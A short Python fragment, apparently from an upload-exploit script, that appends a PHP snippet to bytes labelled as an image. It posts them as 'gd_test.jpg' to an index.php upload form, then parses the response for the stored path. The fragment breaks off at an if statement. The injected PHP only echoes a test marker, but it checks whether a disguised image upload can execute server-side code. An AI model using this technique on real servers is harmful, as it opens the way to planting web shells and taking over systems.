gd_exploit += b'<?php echo "GD_WORKS"; ?>'
files = {'userfile': ('gd_test.jpg', gd_exploit, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
